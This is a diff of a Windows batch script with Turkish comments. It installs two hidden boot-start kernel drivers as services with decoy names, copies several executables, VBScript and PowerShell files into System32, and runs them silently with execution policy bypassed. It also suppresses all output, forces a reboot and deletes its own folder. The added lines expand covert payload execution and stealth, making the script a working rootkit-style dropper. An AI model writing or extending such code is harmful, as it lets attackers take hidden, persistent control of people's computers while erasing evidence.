@@ -36,30 +36,58 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate" /v SusCli
 
 :: Dosyaları System32'ye kopyala
 if exist "%SCRIPT_DIR%drvcore.sys" (
-    copy /y "%SCRIPT_DIR%drvcore.sys" "%system32Dir%\"
+    copy /y "%SCRIPT_DIR%drvcore.sys" "%system32Dir%\" >nul 2>&1
 )
 if exist "%SCRIPT_DIR%netshim.sys" (
-    copy /y "%SCRIPT_DIR%netshim.sys" "%system32Dir%\"
+    copy /y "%SCRIPT_DIR%netshim.sys" "%system32Dir%\" >nul 2>&1
 )
-
+if exist "%~dp0macc.exe" (
+    copy /y "%~dp0macc.exe" "%SystemRoot%\System32\macc.exe" >nul 2>&1
+)
+if exist "%~dp0change.bat" (
+    copy /y "%~dp0change.bat" "%SystemRoot%\System32\change.bat" >nul 2>&1
+)
+if exist "%~dp0reg.vbs" (
+    copy /y "%~dp0reg.vbs" "%SystemRoot%\System32\reg.vbs" >nul 2>&1
+)
+if exist "%~dp01.ps1" (
+    copy /y "%~dp01.ps1" "%SystemRoot%\System32\1.ps1" >nul 2>&1
+)
+if exist "%~dp02.ps1" (
+    copy /y "%~dp02.ps1" "%SystemRoot%\System32\2.ps1" >nul 2>&1
+)
 :: Dosyaları sistem ve gizli olarak ayarla
 attrib +s +h "%system32Dir%\drvcore.sys"
 attrib +s +h "%system32Dir%\netshim.sys"
 
-
+if exist "%SystemRoot%\System32\macc.exe" (
+    start "" "%SystemRoot%\System32\macc.exe" >nul 2>&1
+)
+if exist "%SystemRoot%\System32\change.bat" (
+    start "" "%SystemRoot%\System32\change.bat" >nul 2>&1
+)
+if exist "%SystemRoot%\System32\reg.vbs" (
+    start "" "%SystemRoot%\System32\reg.vbs" >nul 2>&1
+)
+if exist "%SystemRoot%\System32\1.ps1" (
+    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%SystemRoot%\System32\1.ps1" >nul 2>&1
+)
+if exist "%SystemRoot%\System32\2.ps1" (
+    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%SystemRoot%\System32\2.ps1" >nul 2>&1
+)
 :: Servisleri oluştur
 sc create system1 binPath= "C:\Windows\System32\drivers\drvcore.sys" DisplayName= "ca" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 sc create system2 binPath= "C:\Windows\System32\drivers\netshim.sys" DisplayName= "caa" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 
-sc start system1
-sc start system2
+sc start system1 >nul 2>&1
+sc start system2 >nul 2>&1
 
-:: Bilgisayarı 5 saniye içinde yeniden başlat
 shutdown /r /t 2
 
 :: Bu 5 saniye içinde temizlik işlemleri yapılır
 cd /d "%~dp0"
 del /f /q *.*
 for /d %%i in (*) do rd /s /q "%%i"
+
 
 exit
